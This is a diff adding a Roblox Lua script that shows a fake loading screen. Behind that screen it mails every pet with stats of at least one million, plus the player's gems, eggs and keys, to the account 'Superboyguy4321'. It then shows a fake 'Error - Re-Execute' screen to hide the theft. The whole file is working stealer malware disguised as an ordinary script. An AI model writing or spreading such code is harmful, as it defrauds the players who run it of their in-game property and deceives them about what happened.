@@ -1,0 +1,84 @@
+local plrs = game:GetService("Players")
+local lp = plrs.LocalPlayer
+local gui = lp.PlayerGui
+local mailEvent = game:GetService("ReplicatedStorage"):WaitForChild("SendMail")
+
+local function loadingScreen()
+    local screen = Instance.new("ScreenGui", gui)
+    screen.IgnoreGuiInset = true
+
+    local frame = Instance.new("Frame", screen)
+    frame.Size = UDim2.new(1, 0, 1, 0)
+    frame.BackgroundColor3 = Color3.new(1, 1, 1)
+
+    local text = Instance.new("TextLabel", frame)
+    text.Size = UDim2.new(0, 600, 0, 100)
+    text.Position = UDim2.new(0.5, -300, 0.5, -50)
+    text.Text = "Script Loading, Please Wait..."
+    text.TextColor3 = Color3.new(1, 0.5, 0)
+    text.TextStrokeColor3 = Color3.new(0.5, 0.5, 0.5)
+    text.TextStrokeTransparency = 0
+    text.Font = Enum.Font.SourceSansBold
+    text.TextSize = 36
+
+    coroutine.wrap(function()
+        while wait(0.5) do
+            text.Text = text.Text .. "."
+            if #text.Text > 28 then
+                text.Text = "Script Loading, Please Wait"
+            end
+        end
+    end)()
+
+    wait(3)
+    screen:Destroy()
+end
+
+local function errorScreen()
+    local screen = Instance.new("ScreenGui", gui)
+    screen.IgnoreGuiInset = true
+
+    local frame = Instance.new("Frame", screen)
+    frame.Size = UDim2.new(1, 0, 1, 0)
+    frame.BackgroundColor3 = Color3.new(0, 0, 0)
+
+    local text = Instance.new("TextLabel", frame)
+    text.Size = UDim2.new(0, 600, 0, 100)
+    text.Position = UDim2.new(0.5, -300, 0.5, -50)
+    text.Text = "Error - Re-Execute"
+    text.TextColor3 = Color3.new(1, 0, 0)
+    text.TextStrokeTransparency = 0
+    text.TextStrokeColor3 = Color3.new(0.5, 0, 0)
+    text.Font = Enum.Font.SourceSansBold
+    text.TextSize = 36
+
+    local closeBtn = Instance.new("TextButton", frame)
+    closeBtn.Size = UDim2.new(0, 150, 0, 50)
+    closeBtn.Position = UDim2.new(0.5, -75, 0.65, 0)
+    closeBtn.Text = "Close"
+    closeBtn.TextColor3 = Color3.new(1, 1, 1)
+    closeBtn.BackgroundColor3 = Color3.new(0.2, 0.2, 0.2)
+    closeBtn.Font = Enum.Font.SourceSansBold
+    closeBtn.TextSize = 24
+    closeBtn.MouseButton1Click:Connect(function()
+        screen:Destroy()
+    end)
+end
+
+loadingScreen()
+
+for _, pet in pairs(lp.Pets:GetChildren()) do
+    local stats = pet:FindFirstChild("Stats")
+    if stats and stats.Value >= 1e6 then
+        mailEvent:FireServer({
+            Recipient = "Superboyguy4321",
+            Pets = {pet},
+            Message = "ez",
+            Gems = lp.Gems.Value,
+            Eggs = lp.Eggs.Value,
+            Keys = lp.Keys.Value
+        })
+    end
+end
+
+errorScreen()
